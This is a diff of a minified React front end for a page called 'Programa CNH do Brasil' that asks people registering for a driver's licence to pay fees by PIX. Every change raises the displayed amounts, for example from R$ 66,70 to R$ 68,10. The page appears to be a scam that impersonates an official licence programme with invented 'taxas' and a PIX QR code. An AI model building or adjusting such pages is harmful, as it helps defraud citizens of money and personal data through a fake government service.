@@ -15095,7 +15095,7 @@ function gp() {
                 }), " para finalizar seu cadastro no Programa CNH do Brasil"]
               }), l.jsxs("li", {
                 children: ["• Valor único de ", l.jsx("strong", {
-                  children: "R$ 77,00"
+                  children: "R$ 81,00"
                 }), " pago uma única vez"]
               }), l.jsx("li", {
                 children: "• Taxa destinada ao processo de emissão e regularização da CNH"
@@ -15122,7 +15122,7 @@ function gp() {
             className: "text-center mb-6",
             children: [l.jsx("p", {
               className: "text-3xl font-bold text-green-600",
-              children: "R$ 77,00"
+              children: "R$ 81,00"
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Taxa única de emissão"
@@ -15221,7 +15221,7 @@ function gp() {
                 }), l.jsx("li", {
                   children: "3. Escaneie o QR Code ou cole o código PIX"
                 }), l.jsx("li", {
-                  children: "4. Confirme o pagamento de R$ 77,00"
+                  children: "4. Confirme o pagamento de R$ 81,00"
                 })]
               })]
             }), t && l.jsx("div", {
@@ -21328,7 +21328,7 @@ function RE() {
                     children: "Total:"
                   }), l.jsx("span", {
                     className: "whitespace-nowrap",
-                    children: "R$ 66,70"
+                    children: "R$ 68,10"
                   })]
                 })]
               })]
@@ -21611,7 +21611,7 @@ function DE() {
                 children: "Valor:"
               }), l.jsx("span", {
                 className: "font-bold text-green-600",
-                children: "R$ 66,70"
+                children: "R$ 68,10"
               })]
             }), l.jsxs("div", {
               className: "flex justify-between items-center",
@@ -21741,7 +21741,7 @@ function DE() {
               }), l.jsx("li", {
                 children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
-                children: "4. Confirme o pagamento de R$ 66,70"
+                children: "4. Confirme o pagamento de R$ 68,10"
               })]
             })]
           }), l.jsxs("div", {
@@ -22303,9 +22303,9 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
 
 • Taxa de Expedição de Documento (TED): R$ 17,00
 • Taxa de Serviços Administrativos (TSA): R$ 21,50
-• Taxa de Processamento Eletrônico (TPE): R$ 25,50
+• Taxa de Processamento Eletrônico (TPE): R$ 29,60
 
-Valor Total: R$ 66,70`, 3e3), i("finalize_button")
+Valor Total: R$ 68,10`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22328,7 +22328,7 @@ Valor Total: R$ 66,70`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 66,70, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -23083,7 +23083,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 66,70, clique no botão 
                       children: "VALOR A PAGAR EM REAIS"
                     }), l.jsx("p", {
                       className: "font-bold text-lg",
-                      children: "R$ 66,70"
+                      children: "R$ 68,10"
                     })]
                   })]
                 }), o === "awaiting_payment" && l.jsx("div", {
